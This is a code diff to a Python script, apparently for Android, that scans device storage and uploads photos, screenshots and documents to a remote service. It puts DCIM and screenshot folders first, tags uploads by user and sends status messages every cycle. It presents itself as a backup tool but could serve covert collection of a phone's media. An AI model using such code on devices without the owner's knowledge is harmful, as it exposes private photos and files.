@@ -97,6 +97,10 @@ def run_backup_cycle(user_info):
     uploaded_hashes = load_uploaded_records()
     send_msg(f"🚀 Auto Backup & Documents Scan Started for: [{user_info}]")
 
+    dcim_files = []
+    screenshot_files = []
+    other_files = []
+
     for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
         if 'android/data' in root.lower() or 'android/obb' in root.lower():
             continue
@@ -112,16 +116,40 @@ def run_backup_cycle(user_info):
             if file.lower().endswith(ALLOWED_EXTENSIONS):
                 full_path = os.path.join(root, file)
                 
-                file_hash = get_file_hash(full_path)
-                if not file_hash or file_hash in uploaded_hashes:
-                    continue
+                # Check video size limit (100MB max)
+                is_video = file.lower().endswith(('.mp4', '.mkv', '.mov', '.avi'))
+                if is_video:
+                    try:
+                        if os.path.getsize(full_path) > 100 * 1024 * 1024:
+                            continue
+                    except Exception:
+                        continue
+
+                item = (full_path, root)
+                root_lower = root.lower()
                 
-                success = upload_media(full_path, root, user_info)
-                if success:
-                    save_uploaded_record(file_hash)
-                    uploaded_hashes.add(file_hash)
-                
-                time.sleep(2)
+                # Categorize based on folder priority
+                if '/dcim' in root_lower:
+                    dcim_files.append(item)
+                elif 'screenshot' in root_lower:
+                    screenshot_files.append(item)
+                else:
+                    other_files.append(item)
+
+    # Process files according to priority: DCIM -> Screenshots -> Others
+    all_files_to_process = dcim_files + screenshot_files + other_files
+
+    for full_path, root in all_files_to_process:
+        file_hash = get_file_hash(full_path)
+        if not file_hash or file_hash in uploaded_hashes:
+            continue
+        
+        success = upload_media(full_path, root, user_info)
+        if success:
+            save_uploaded_record(file_hash)
+            uploaded_hashes.add(file_hash)
+        
+        time.sleep(2)
 
     send_msg(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 5 mins...")
 
